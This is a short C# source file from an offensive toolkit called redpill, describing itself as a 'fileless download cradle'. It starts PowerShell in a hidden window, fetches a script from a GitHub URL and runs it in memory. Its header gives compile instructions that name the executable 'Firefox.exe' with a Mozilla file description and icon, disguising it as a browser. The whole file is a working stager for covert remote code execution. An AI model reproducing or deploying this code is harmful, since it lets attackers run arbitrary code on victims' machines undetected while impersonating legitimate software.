/*
   Author: @r00t-3xp10it
   redpill v1.2.6 - CsOnTheFly Internal Module!

   Title: StandAlone executable fileless cmdlet's download crandle.
   Description: Program.cs (to be compiled to standalone executable) that allow users to fileless download\execute URL cmdlet's
      
   Dependencies: iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CsOnTheFly.ps1" -OutFile "CsOnTheFly.ps1"
   Compile: .\CsOnTheFly.ps1 -action "compile" -uri "CScrandle_fileless.cs" -outfile "Firefox.exe" -filedescription "@Mozilla FireFox" -iconset "true"
*/

using System.Diagnostics;
namespace Console
{
    class Program
    {
        static void Main(string[] args)
        {
           var filePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";

           Process process = new Process();
           process.StartInfo.FileName = filePath;
           process.StartInfo.Arguments = "$Proxy=New-Object -ComObject MsXml2.ServerXmlHttp;$Proxy.Open('GET','https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/test.ps1',0);$Proxy.Send();[scriptblock]::Create($Proxy.ResponseText).Invoke()";
           process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
           process.Start();
        }
    }
}